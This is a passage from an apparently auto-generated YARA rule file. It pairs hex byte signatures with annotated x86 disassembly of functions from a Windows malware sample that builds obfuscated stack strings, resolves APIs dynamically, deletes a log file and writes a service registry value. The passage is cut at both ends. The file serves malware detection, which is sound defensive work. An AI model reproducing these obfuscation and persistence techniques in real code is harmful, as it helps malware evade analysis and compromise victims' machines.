6C C6 44 24 ?? 6F C6 44 24 ?? 67 C6 44 24 ?? 2E C6 44 24 ?? 64 C6 44 24 ?? 61 88 5C 24 ?? C6 44 24 ?? 00 FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 8D 54 24 ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D6 E8 ?? ?? ?? ?? 5F 5E 5B 81 C4 34 01 00 00 C3 }
        /*
Basic Block at 0x00406270@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00406270  
        .text:0x00406270  FUNC: int cdecl sub_00406270( ) [2 XREFS] 
        .text:0x00406270  
        .text:0x00406270  Stack Variables: (offset from initial top of stack)
        .text:0x00406270          -260: int local260
        .text:0x00406270          -261: int local261
        .text:0x00406270          -262: int local262
        .text:0x00406270          -263: int local263
        .text:0x00406270          -264: int local264
        .text:0x00406270          -265: int local265
        .text:0x00406270          -266: int local266
        .text:0x00406270          -267: int local267
        .text:0x00406270          -268: int local268
        .text:0x00406270          -269: int local269
        .text:0x00406270          -270: int local270
        .text:0x00406270          -271: int local271
        .text:0x00406270          -272: int local272
        .text:0x00406270          -273: int local273
        .text:0x00406270          -274: int local274
        .text:0x00406270          -275: int local275
        .text:0x00406270          -276: int local276
        .text:0x00406270          -277: int local277
        .text:0x00406270          -278: int local278
        .text:0x00406270          -279: int local279
        .text:0x00406270          -280: int local280
        .text:0x00406270          -284: int local284
        .text:0x00406270          -285: int local285
        .text:0x00406270          -286: int local286
        .text:0x00406270          -287: int local287
        .text:0x00406270          -288: int local288
        .text:0x00406270          -289: int local289
        .text:0x00406270          -290: int local290
        .text:0x00406270          -291: int local291
        .text:0x00406270          -292: int local292
        .text:0x00406270          -293: int local293
        .text:0x00406270          -294: int local294
        .text:0x00406270          -295: int local295
        .text:0x00406270          -296: int local296
        .text:0x00406270          -297: int local297
        .text:0x00406270          -298: int local298
        .text:0x00406270          -299: int local299
        .text:0x00406270          -300: int local300
        .text:0x00406270          -301: int local301
        .text:0x00406270          -302: int local302
        .text:0x00406270          -303: int local303
        .text:0x00406270          -304: int local304
        .text:0x00406270          -305: int local305
        .text:0x00406270          -306: int local306
        .text:0x00406270          -307: int local307
        .text:0x00406270          -308: int local308
        .text:0x00406270  
        .text:0x00406270  81ec34010000     sub esp,308
        .text:0x00406276  b045             mov al,69
        .text:0x00406278  53               push ebx
        .text:0x00406279  56               push esi
        .text:0x0040627a  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00406280  88442415         mov byte [esp + 21],al
        .text:0x00406284  88442418         mov byte [esp + 24],al
        .text:0x00406288  57               push edi
        .text:0x00406289  b065             mov al,101
        .text:0x0040628b  b374             mov bl,116
        .text:0x0040628d  b179             mov cl,121
        .text:0x0040628f  6a00             push 0
        .text:0x00406291  c644241c4b       mov byte [esp + 28],75
        .text:0x00406296  c644241e52       mov byte [esp + 30],82
        .text:0x0040629b  c644241f4e       mov byte [esp + 31],78
        .text:0x004062a0  c64424214c       mov byte [esp + 33],76
        .text:0x004062a5  c644242233       mov byte [esp + 34],51
        .text:0x004062aa  c644242332       mov byte [esp + 35],50
        .text:0x004062af  c64424242e       mov byte [esp + 36],46
        .text:0x004062b4  c644242564       mov byte [esp + 37],100
        .text:0x004062b9  c64424266c       mov byte [esp + 38],108
        .text:0x004062be  c64424276c       mov byte [esp + 39],108
        .text:0x004062c3  c644242800       mov byte [esp + 40],0
        .text:0x004062c8  c644242c47       mov byte [esp + 44],71
        .text:0x004062cd  8844242d         mov byte [esp + 45],al
        .text:0x004062d1  885c242e         mov byte [esp + 46],bl
        .text:0x004062d5  c644242f53       mov byte [esp + 47],83
        .text:0x004062da  884c2430         mov byte [esp + 48],cl
        .text:0x004062de  c644243173       mov byte [esp + 49],115
        .text:0x004062e3  885c2432         mov byte [esp + 50],bl
        .text:0x004062e7  88442433         mov byte [esp + 51],al
        .text:0x004062eb  c64424346d       mov byte [esp + 52],109
        .text:0x004062f0  c644243544       mov byte [esp + 53],68
        .text:0x004062f5  c644243669       mov byte [esp + 54],105
        .text:0x004062fa  c644243772       mov byte [esp + 55],114
        .text:0x004062ff  88442438         mov byte [esp + 56],al
        .text:0x00406303  c644243963       mov byte [esp + 57],99
        .text:0x00406308  885c243a         mov byte [esp + 58],bl
        .text:0x0040630c  c644243b6f       mov byte [esp + 59],111
        .text:0x00406311  c644243c72       mov byte [esp + 60],114
        .text:0x00406316  884c243d         mov byte [esp + 61],cl
        .text:0x0040631a  c644243e41       mov byte [esp + 62],65
        .text:0x0040631f  c644243f00       mov byte [esp + 63],0
        .text:0x00406324  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406326  8d442428         lea eax,dword [esp + 40]
        .text:0x0040632a  8d4c2418         lea ecx,dword [esp + 24]
        .text:0x0040632e  50               push eax
        .text:0x0040632f  51               push ecx
        .text:0x00406330  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(local1472)
        .text:0x00406336  50               push eax
        .text:0x00406337  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(kernel32,local1456)
        .text:0x0040633d  6a00             push 0
        .text:0x0040633f  8bf8             mov edi,eax
        .text:0x00406341  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406343  8d54243c         lea edx,dword [esp + 60]
        .text:0x00406347  6804010000       push 260
        .text:0x0040634c  52               push edx
        .text:0x0040634d  ffd7             call edi    ;kernel32.GetSystemDirectoryA(local1436,260)
        .text:0x0040634f  6a00             push 0
        .text:0x00406351  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406353  6a00             push 0
        .text:0x00406355  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406357  6a00             push 0
        .text:0x00406359  c64424105c       mov byte [esp + 16],92
        .text:0x0040635e  c64424116f       mov byte [esp + 17],111
        .text:0x00406363  c644241275       mov byte [esp + 18],117
        .text:0x00406368  c644241372       mov byte [esp + 19],114
        .text:0x0040636d  c64424146c       mov byte [esp + 20],108
        .text:0x00406372  c64424156f       mov byte [esp + 21],111
        .text:0x00406377  c644241667       mov byte [esp + 22],103
        .text:0x0040637c  c64424172e       mov byte [esp + 23],46
        .text:0x00406381  c644241864       mov byte [esp + 24],100
        .text:0x00406386  c644241961       mov byte [esp + 25],97
        .text:0x0040638b  885c241a         mov byte [esp + 26],bl
        .text:0x0040638f  c644241b00       mov byte [esp + 27],0
        .text:0x00406394  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406396  8d44240c         lea eax,dword [esp + 12]
        .text:0x0040639a  8d4c243c         lea ecx,dword [esp + 60]
        .text:0x0040639e  50               push eax
        .text:0x0040639f  51               push ecx
        .text:0x004063a0  ff15cc904000     call dword [0x004090cc]    ;kernel32.lstrcatA(local1436,local1484)
        .text:0x004063a6  6a00             push 0
        .text:0x004063a8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063aa  6a00             push 0
        .text:0x004063ac  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063ae  8d54243c         lea edx,dword [esp + 60]
        .text:0x004063b2  52               push edx
        .text:0x004063b3  ff1518914000     call dword [0x00409118]    ;kernel32.DeleteFileA(local1436)
        .text:0x004063b9  6a00             push 0
        .text:0x004063bb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063bd  e85ef5ffff       call 0x00405920    ;sub_00405920()
        .text:0x004063c2  5f               pop edi
        .text:0x004063c3  5e               pop esi
        .text:0x004063c4  5b               pop ebx
        .text:0x004063c5  81c434010000     add esp,308
        .text:0x004063cb  c3               ret 
        */
        $c11 = { 81 EC 34 01 00 00 B0 45 53 56 8B 35 ?? ?? ?? ?? 88 44 24 ?? 88 44 24 ?? 57 B0 65 B3 74 B1 79 6A 00 C6 44 24 ?? 4B C6 44 24 ?? 52 C6 44 24 ?? 4E C6 44 24 ?? 4C C6 44 24 ?? 33 C6 44 24 ?? 32 C6 44 24 ?? 2E C6 44 24 ?? 64 C6 44 24 ?? 6C C6 44 24 ?? 6C C6 44 24 ?? 00 C6 44 24 ?? 47 88 44 24 ?? 88 5C 24 ?? C6 44 24 ?? 53 88 4C 24 ?? C6 44 24 ?? 73 88 5C 24 ?? 88 44 24 ?? C6 44 24 ?? 6D C6 44 24 ?? 44 C6 44 24 ?? 69 C6 44 24 ?? 72 88 44 24 ?? C6 44 24 ?? 63 88 5C 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 72 88 4C 24 ?? C6 44 24 ?? 41 C6 44 24 ?? 00 FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 8D 54 24 ?? 68 04 01 00 00 52 FF D7 6A 00 FF D6 6A 00 FF D6 6A 00 C6 44 24 ?? 5C C6 44 24 ?? 6F C6 44 24 ?? 75 C6 44 24 ?? 72 C6 44 24 ?? 6C C6 44 24 ?? 6F C6 44 24 ?? 67 C6 44 24 ?? 2E C6 44 24 ?? 64 C6 44 24 ?? 61 88 5C 24 ?? C6 44 24 ?? 00 FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 8D 54 24 ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D6 E8 ?? ?? ?? ?? 5F 5E 5B 81 C4 34 01 00 00 C3 }
        /*
Basic Block at 0x00406650@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00406650  
        .text:0x00406650  FUNC: int cdecl sub_00406650( int arg0, ) [4 XREFS] 
        .text:0x00406650  
        .text:0x00406650  Stack Variables: (offset from initial top of stack)
        .text:0x00406650             4: int arg0
        .text:0x00406650          -1023: int local1023
        .text:0x00406650          -1024: int local1024
        .text:0x00406650          -1283: int local1283
        .text:0x00406650          -1284: int local1284
        .text:0x00406650          -1290: int local1290
        .text:0x00406650          -1292: int local1292
        .text:0x00406650          -1294: int local1294
        .text:0x00406650          -1298: int local1298
        .text:0x00406650          -1300: int local1300
        .text:0x00406650          -1304: int local1304
        .text:0x00406650          -1305: int local1305
        .text:0x00406650          -1306: int local1306
        .text:0x00406650          -1307: int local1307
        .text:0x00406650          -1308: int local1308
        .text:0x00406650          -1309: int local1309
        .text:0x00406650          -1310: int local1310
        .text:0x00406650          -1311: int local1311
        .text:0x00406650          -1312: int local1312
        .text:0x00406650          -1313: int local1313
        .text:0x00406650          -1314: int local1314
        .text:0x00406650          -1315: int local1315
        .text:0x00406650          -1316: int local1316
        .text:0x00406650          -1317: int local1317
        .text:0x00406650          -1318: int local1318
        .text:0x00406650          -1319: int local1319
        .text:0x00406650          -1320: int local1320
        .text:0x00406650          -1321: int local1321
        .text:0x00406650          -1322: int local1322
        .text:0x00406650          -1323: int local1323
        .text:0x00406650          -1324: int local1324
        .text:0x00406650          -1325: int local1325
        .text:0x00406650          -1326: int local1326
        .text:0x00406650          -1327: int local1327
        .text:0x00406650          -1328: int local1328
        .text:0x00406650          -1329: int local1329
        .text:0x00406650          -1330: int local1330
        .text:0x00406650          -1331: int local1331
        .text:0x00406650          -1332: int local1332
        .text:0x00406650          -1333: int local1333
        .text:0x00406650          -1334: int local1334
        .text:0x00406650          -1335: int local1335
        .text:0x00406650          -1336: int local1336
        .text:0x00406650          -1337: int local1337
        .text:0x00406650          -1338: int local1338
        .text:0x00406650          -1339: int local1339
        .text:0x00406650          -1340: int local1340
        .text:0x00406650          -1341: int local1341
        .text:0x00406650          -1342: int local1342
        .text:0x00406650          -1343: int local1343
        .text:0x00406650          -1344: int local1344
        .text:0x00406650          -1345: int local1345
        .text:0x00406650          -1346: int local1346
        .text:0x00406650          -1347: int local1347
        .text:0x00406650          -1348: int local1348
        .text:0x00406650          -1349: int local1349
        .text:0x00406650          -1350: int local1350
        .text:0x00406650          -1351: int local1351
        .text:0x00406650          -1352: int local1352
        .text:0x00406650          -1353: int local1353
        .text:0x00406650          -1354: int local1354
        .text:0x00406650          -1355: int local1355
        .text:0x00406650          -1356: int local1356
        .text:0x00406650          -1357: int local1357
        .text:0x00406650          -1358: int local1358
        .text:0x00406650          -1359: int local1359
        .text:0x00406650          -1360: int local1360
        .text:0x00406650          -1361: int local1361
        .text:0x00406650          -1362: int local1362
        .text:0x00406650          -1363: int local1363
        .text:0x00406650          -1364: int local1364
        .text:0x00406650          -1368: int local1368
        .text:0x00406650          -1369: int local1369
        .text:0x00406650          -1370: int local1370
        .text:0x00406650          -1371: int local1371
        .text:0x00406650          -1372: int local1372
        .text:0x00406650          -1373: int local1373
        .text:0x00406650          -1374: int local1374
        .text:0x00406650          -1375: int local1375
        .text:0x00406650          -1376: int local1376
        .text:0x00406650  
        .text:0x00406650  81ec60050000     sub esp,1376
        .text:0x00406656  53               push ebx
        .text:0x00406657  55               push ebp
        .text:0x00406658  56               push esi
        .text:0x00406659  57               push edi
        .text:0x0040665a  b9ff000000       mov ecx,255
        .text:0x0040665f  33c0             xor eax,eax
        .text:0x00406661  8dbc2471010000   lea edi,dword [esp + 369]
        .text:0x00406668  c684247001000000 mov byte [esp + 368],0
        .text:0x00406670  f3ab             rep: stosd 
        .text:0x00406672  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00406678  6a00             push 0
        .text:0x0040667a  66ab             stosd 
        .text:0x0040667c  aa               stosb 
        .text:0x0040667d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040667f  b343             mov bl,67
        .text:0x00406681  b053             mov al,83
        .text:0x00406683  885c243b         mov byte [esp + 59],bl
        .text:0x00406687  885c2442         mov byte [esp + 66],bl
        .text:0x0040668b  b36f             mov bl,111
        .text:0x0040668d  88442434         mov byte [esp + 52],al
        .text:0x00406691  88442436         mov byte [esp + 54],al
        .text:0x00406695  885c2443         mov byte [esp + 67],bl
        .text:0x00406699  885c2447         mov byte [esp + 71],bl
        .text:0x0040669d  88442449         mov byte [esp + 73],al
        .text:0x004066a1  8844244d         mov byte [esp + 77],al
        .text:0x004066a5  b25c             mov dl,92
        .text:0x004066a7  b174             mov cl,116
        .text:0x004066a9  b073             mov al,115
        .text:0x004066ab  b325             mov bl,37
        .text:0x004066ad  6a00             push 0
        .text:0x004066af  c644243959       mov byte [esp + 57],89
        .text:0x004066b4  c644243b54       mov byte [esp + 59],84
        .text:0x004066b9  c644243c45       mov byte [esp + 60],69
        .text:0x004066be  c644243d4d       mov byte [esp + 61],77
        .text:0x004066c3  8854243e         mov byte [esp + 62],dl
        .text:0x004066c7  c644244075       mov byte [esp + 64],117
        .text:0x004066cc  c644244172       mov byte [esp + 65],114
        .text:0x004066d1  c644244272       mov byte [esp + 66],114
        .text:0x004066d6  c644244365       mov byte [esp + 67],101
        .text:0x004066db  c64424446e       mov byte [esp + 68],110
        .text:0x004066e0  884c2445         mov byte [esp + 69],cl
        .text:0x004066e4  c64424486e       mov byte [esp + 72],110
        .text:0x004066e9  884c2449         mov byte [esp + 73],cl
        .text:0x004066ed  c644244a72       mov byte [esp + 74],114
        .text:0x004066f2  c644244c6c       mov byte [esp + 76],108
        .text:0x004066f7  c644244e65       mov byte [esp + 78],101
        .text:0x004066fc  884c244f         mov byte [esp + 79],cl
        .text:0x00406700  88542450         mov byte [esp + 80],dl
        .text:0x00406704  c644245265       mov byte [esp + 82],101
        .text:0x00406709  c644245372       mov byte [esp + 83],114
        .text:0x0040670e  c644245476       mov byte [esp + 84],118
        .text:0x00406713  c644245569       mov byte [esp + 85],105
        .text:0x00406718  c644245663       mov byte [esp + 86],99
        .text:0x0040671d  c644245765       mov byte [esp + 87],101
        .text:0x00406722  88442458         mov byte [esp + 88],al
        .text:0x00406726  88542459         mov byte [esp + 89],dl
        .text:0x0040672a  885c245a         mov byte [esp + 90],bl
        .text:0x0040672e  8844245b         mov byte [esp + 91],al
        .text:0x00406732  c644245c00       mov byte [esp + 92],0
        .text:0x00406737  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406739  8b842474050000   mov eax,dword [esp + 1396]
        .text:0x00406740  8b2dd8914000     mov ebp,dword [0x004091d8]
        .text:0x00406746  8d4c2434         lea ecx,dword [esp + 52]
        .text:0x0040674a  50               push eax
        .text:0x0040674b  8d942474010000   lea edx,dword [esp + 372]
        .text:0x00406752  51               push ecx
        .text:0x00406753  52               push edx
        .text:0x00406754  ffd5             call ebp    ;user32.wsprintfA(local1024,local1340)
        .text:0x00406756  83c40c           add esp,12
        .text:0x00406759  6a00             push 0
        .text:0x0040675b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040675d  6a00             push 0
        .text:0x0040675f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406761  8d44245c         lea eax,dword [esp + 92]
        .text:0x00406765  50               push eax
        .text:0x00406766  ff1528914000     call dword [0x00409128]    ;kernel32.GetLocalTime(local1300)
        .text:0x0040676c  b940000000       mov ecx,64
        .text:0x00406771  33c0             xor eax,eax
        .text:0x00406773  8d7c246d         lea edi,dword [esp + 109]
        .text:0x00406777  c644246c00       mov byte [esp + 108],0
        .text:0x0040677c  f3ab             rep: stosd 
        .text:0x0040677e  66ab             stosd 
        .text:0x00406780  aa               stosb 
        .text:0x00406781  b064             mov al,100
        .text:0x00406783  b22e             mov dl,46
        .text:0x00406785  b132             mov cl,50
        .text:0x00406787  6a00             push 0
        .text:0x00406789  885c2420         mov byte [esp + 32],bl
        .text:0x0040678d  c644242134       mov byte [esp + 33],52
        .text:0x00406792  88442422         mov byte [esp + 34],al
        .text:0x00406796  c64424232d       mov byte [esp + 35],45
        .text:0x0040679b  885c2424         mov byte [esp + 36],bl
        .text:0x0040679f  88542425         mov byte [esp + 37],dl
        .text:0x004067a3  884c2426         mov byte [esp + 38],cl
        .text:0x004067a7  88442427         mov byte [esp + 39],al
        .text:0x004067ab  c64424282d       mov byte [esp + 40],45
        .text:0x004067b0  885c2429         mov byte [esp + 41],bl
        .text:0x004067b4  8854242a         mov byte [esp + 42],dl
        .text:0x004067b8  884c242b         mov byte [esp + 43],cl
        .text:0x004067bc  8844242c         mov byte [esp + 44],al
        .text:0x004067c0  c644242d20       mov byte [esp + 45],32
        .text:0x004067c5  885c242e         mov byte [esp + 46],bl
        .text:0x004067c9  8854242f         mov byte [esp + 47],dl
        .text:0x004067cd  884c2430         mov byte [esp + 48],cl
        .text:0x004067d1  88442431         mov byte [esp + 49],al
        .text:0x004067d5  c64424323a       mov byte [esp + 50],58
        .text:0x004067da  885c2433         mov byte [esp + 51],bl
        .text:0x004067de  88542434         mov byte [esp + 52],dl
        .text:0x004067e2  884c2435         mov byte [esp + 53],cl
        .text:0x004067e6  88442436         mov byte [esp + 54],al
        .text:0x004067ea  c644243700       mov byte [esp + 55],0
        .text:0x004067ef  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004067f1  8b4c2466         mov ecx,dword [esp + 102]
        .text:0x004067f5  8b542464         mov edx,dword [esp + 100]
        .text:0x004067f9  8b442462         mov eax,dword [esp + 98]
        .text:0x004067fd  81e1ffff0000     and ecx,0x0000ffff
        .text:0x00406803  81e2ffff0000     and edx,0x0000ffff
        .text:0x00406809  51               push ecx
        .text:0x0040680a  8b4c2462         mov ecx,dword [esp + 98]
        .text:0x0040680e  52               push edx
        .text:0x0040680f  8b542464         mov edx,dword [esp + 100]
        .text:0x00406813  25ffff0000       and eax,0x0000ffff
        .text:0x00406818  81e1ffff0000     and ecx,0x0000ffff
        .text:0x0040681e  50               push eax
        .text:0x0040681f  81e2ffff0000     and edx,0x0000ffff
        .text:0x00406825  51               push ecx
        .text:0x00406826  8d44242c         lea eax,dword [esp + 44]
        .text:0x0040682a  52               push edx
        .text:0x0040682b  8d8c2480000000   lea ecx,dword [esp + 128]
        .text:0x00406832  50               push eax
        .text:0x00406833  51               push ecx
        .text:0x00406834  ffd5             call ebp    ;user32.wsprintfA(local1284,local1364)
        .text:0x00406836  83c41c           add esp,28
        .text:0x00406839  6a00             push 0
        .text:0x0040683b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040683d  8d54246c         lea edx,dword [esp + 108]
        .text:0x00406841  6a00             push 0
        .text:0x00406843  52               push edx
        .text:0x00406844  c64424184d       mov byte [esp + 24],77
        .text:0x00406849  c644241961       mov byte [esp + 25],97
        .text:0x0040684e  c644241a72       mov byte [esp + 26],114
        .text:0x00406853  c644241b6b       mov byte [esp + 27],107
        .text:0x00406858  c644241c54       mov byte [esp + 28],84
        .text:0x0040685d  c644241d69       mov byte [esp + 29],105
        .text:0x00406862  c644241e6d       mov byte [esp + 30],109
        .text:0x00406867  c644241f65       mov byte [esp + 31],101
        .text:0x0040686c  c644242000       mov byte [esp + 32],0
        .text:0x00406871  ff15c4904000     call dword [0x004090c4]    ;kernel32.lstrlenA(local1284)
        .text:0x00406877  50               push eax
        .text:0x00406878  8d442474         lea eax,dword [esp + 116]
        .text:0x0040687c  50               push eax
        .text:0x0040687d  8d4c241c         lea ecx,dword [esp + 28]
        .text:0x00406881  6a01             push 1
        .text:0x00406883  8d942480010000   lea edx,dword [esp + 384]
        .text:0x0040688a  51               push ecx
        .text:0x0040688b  52               push edx
        .text:0x0040688c  6802000080       push 0x80000002
        .text:0x00406891  e84ae3ffff       call 0x00404be0    ;sub_00404be0(0x80000002,local1024,local1376,1,local1284,kernel32.lstrlenA(local1284),0)
        .text:0x00406896  83c41c           add esp,28
        .text:0x00406899  5f               pop edi
        .text:0x0040689a  5e               pop esi
        .text:0x0040689b  5d               pop ebp
        .text:0x0040689c  5b               pop ebx
        .text:0x0040689d  81c460050000     add esp,1376
        .text:0x004068a3  c3               ret 
        */
        $c12 = { 81 EC 60 05 00 00 53 55 56 57 B9 FF 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 00 F3 AB 8B 35 ?? ?? ?? ?? 6A 00 66 AB AA FF D6 B3 43 B0 53 88 5C 24 ?? 88 5C 24 ?? B3 6F 88 44 24 ?? 88 44 24 ?? 88 5C 24 ?? 88 5C 24 ?? 88 44 24 ?? 88 44 24 ?? B2 5C B1 74 B0 73 B3 25 6A 00 C6 44 24 ?? 59 C6 44 24 ?? 54 C6 44 24 ?? 45 C6 44 24 ?? 4D 88 54 24 ?? C6 44 24 ?? 75 C6 44 24 ?? 72 C6 44 24 ?? 72 C6 44 24 ?? 65 C6 44 24 ?? 6E 88 4C 24 ?? C6 44 24 ?? 6E 88 4C 24 ?? C6 44 24 ?? 72 C6 44 24 ?? 6C C6 44 24 ?? 65 88 4C 24 ?? 88 54 24 ?? C6 44 24 ?? 65 C6 44 24 ?? 72 C6 44 24 ?? 76 C6 44 24 ?? 69 C6 44 24 ?? 63 C6 44 24 ?? 65 88 44 24 ?? 88 54 24 ?? 88 5C 24 ?? 88 44 24 ?? C6 44 24 ?? 00 FF D6 8B 84 24 ?? ?? ?? ?? 8B 2D ?? ?? ?? ?? 8D 4C 24 ?? 50 8D 94 24 ?? ?? ?? ?? 51 52 FF D5 83 C4 0C 6A 00 FF D6 6A 00 FF D6 8D 44 24 ?? 50 FF 15 ?? ?? ?? ?? B9 40 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 F3 AB 66 AB AA B0 64 B2 2E B1 32 6A 00 88 5C 24 ?? C6 44 24 ?? 34 88 44 24 ?? C6 44 24 ?? 2D 88 5C 24 ?? 88 54 24 ?? 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 2D 88 5C 24 ?? 88 54 24 ?? 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 20 88 5C 24 ?? 88 54 24 ?? 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 3A 88 5C 24 ?? 88 54 24 ?? 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 00 FF D6 8B 4C 24 ?? 8B 54 24 ?? 8B 44 24 ?? 81 E1 FF FF 00 00 81 E2 FF FF 00 00 51 8B 4C 24 ?? 52 8B 54 24 ?? 25 FF FF 00 00 81 E1 FF FF 00 00 50 81 E2 FF FF 00 00 51 8D 44 24 ?? 52 8D 8C 24 ?? ?? ?? ?? 50 51 FF D5 83 C4 1C 6A 00 FF D6 8D 54 24 ?? 6A 00 52 C6 44 24 ?? 4D C6 44 24 ?? 61 C6 44 24 ?? 72 C6 44 24 ?? 6B C6 44 24 ?? 54 C6 44 24 ?? 69 C6 44 24 ?? 6D C6 44 24 ?? 65 C6 44 24 ?? 00 FF 15 ?? ?? ?? ?? 50 8D 44 24 ?? 50 8D 4C 24 ?? 6A 01 8D 94 24 ?? ?? ?? ?? 51 52 68 02 00 00 80 E8 ?? ?? ?? ?? 83 C4 1C 5F 5E 5D 5B 81 C4 60 05 00 00 C3 }
        /*
Basic Block at 0x00406c90@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00406c90  
        .text:0x00406c90  FUNC: int cdecl sub_00406c90( int arg0, int arg1, ) [4 XREFS] 
        .text:0x00406c90  
        .text:0x00406c90  Stack Variables: (offset from initial top of stack)
        .text:0x00406c90             8: int arg1
        .text:0x00406c90             4: int arg0
        .text:0x00406c90          -256: int local256
        .text:0x00406c90          -259: int local259
        .text:0x00406c90          -260: int local260
        .text:0x00406c90          -261: int local261
        .text:0x00406c90          -262: int local262
        .text:0x00406c90          -263: int local263
        .text:0x00406c90          -264: int local264
        .text:0x00406c90          -265: int local265
        .text:0x00406c90          -266: int local266
        .text:0x00406c90          -267: int local267
        .text:0x00406c90          -268: int local268
        .text:0x00406c90  
        .text:0x00406c90  81ec0c010000     sub esp,268
        .text:0x00406c96  56               push esi
        .text:0x00406c97  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00406c9d  6a00             push 0
        .text:0x00406c9f  c64424084d       mov byte [esp + 8],77
        .text:0x00406ca4  c64424096f       mov byte [esp + 9],111
        .text:0x00406ca9  c644240a74       mov byte [esp + 10],116
        .text:0x00406cae  c644240b68       mov byte [esp + 11],104
        .text:0x00406cb3  c644240c65       mov byte [esp + 12],101
        .text:0x00406cb8  c644240d72       mov byte [esp + 13],114
        .text:0x00406cbd  c644240e33       mov byte [esp + 14],51
        .text:0x00406cc2  c644240f36       mov byte [esp + 15],54
        .text:0x00406cc7  c644241030       mov byte [esp + 16],48
        .text:0x00406ccc  c644241100       mov byte [esp + 17],0
        .text:0x00406cd1  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406cd3  8d442404         lea eax,dword [esp + 4]
        .text:0x00406cd7  6a0a             push 10
        .text:0x00406cd9  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00406cdd  50               push eax
        .text:0x00406cde  51               push ecx
        .text:0x00406cdf  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00406ce5  e866dcffff       call 0x00404950    ;sub_00404950(local256,local268,10)
        .text:0x00406cea  6a00             push 0
        .text:0x00406cec  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406cee  8b942418010000   mov edx,dword [esp + 280]
        .text:0x00406cf5  8b842414010000   mov eax,dword [esp + 276]
        .text:0x00406cfc  81e2ffff0000     and edx,0x0000ffff
        .text:0x00406d02  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x00406d06  52               push edx
        .text:0x00406d07  50               push eax
        .text:0x00406d08  51               push ecx
        .text:0x00406d09  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00406d0f  e8dcdcffff       call 0x004049f0    ;sub_004049f0(local256,arg0,0x0000300f)
        .text:0x00406d14  6a00             push 0
        .text:0x00406d16  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406d18  5e               pop esi
        .text:0x00406d19  81c40c010000     add esp,268
        .text:0x00406d1f  c3               ret 
        */
        $c13 = { 81 EC 0C 01 00 00 56 8B 35 ?? ?? ?? ?? 6A 00 C6 44 24 ?? 4D C6 44 24 ?? 6F C6 44 24 ?? 74 C6 44 24 ?? 68 C6 44 24 ?? 65 C6 44 24 ?? 72 C6 44 24 ?? 33 C6 44 24 ?? 36 C6 44 24 ?? 30 C6 44 24 ?? 00 FF D6 8D 44 24 ?? 6A 0A 8D 4C 24 ?? 50 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 8B 94 24 ?? ?? ?? ?? 8B 84 24 ?? ?? ?? ?? 81 E2 FF FF 00 00 8D 4C 24 ?? 52 50 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 5E 81 C4 0C 01 00 00 C3 }
        /*
Basic Block at 0x00406db0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - contain obfuscated stackstrings
        .text:0x00406db0  
        .text:0x00406db0  FUNC: int cdecl sub_00406db0( ) [2 XREFS] 
        .text:0x00406db0  
        .text:0x00406db0  Stack Variables: (offset from initial top of stack)
        .text:0x00406db0            -8: int local8
        .text:0x00406db0            -9: int local9
        .text:0x00406db0           -10: int local10
        .text:0x00406db0           -11: int local11
        .text:0x00406db0           -12: int local12
        .text:0x00406db0           -13: int local13
        .text:0x00406db0           -14: int local14
        .text:0x00406db0           -15: int local15
        .text:0x00406db0           -16: int local16
        .text:0x00406db0           -17: int local17
        .text:0x00406db0           -18: int local18
        .text:0x00406db0           -19: int local19
        .text:0x00406db0           -20: int local20
        .text:0x00406db0           -24: int local24
        .text:0x00406db0           -25: int local25
        .text:0x00406db0           -26: int local26
        .text:0x00406db0           -27: int local27
        .text:0x00406db0           -28: int local28
        .text:0x00406db0           -29: int local29
        .text:0x00406db0           -30: int local30
        .text:0x00406db0           -31: int local31
        .text:0x00406db0           -32: int local32
        .text:0x00406db0           -33: int local33
        .text:0x00406db0           -34: int local34
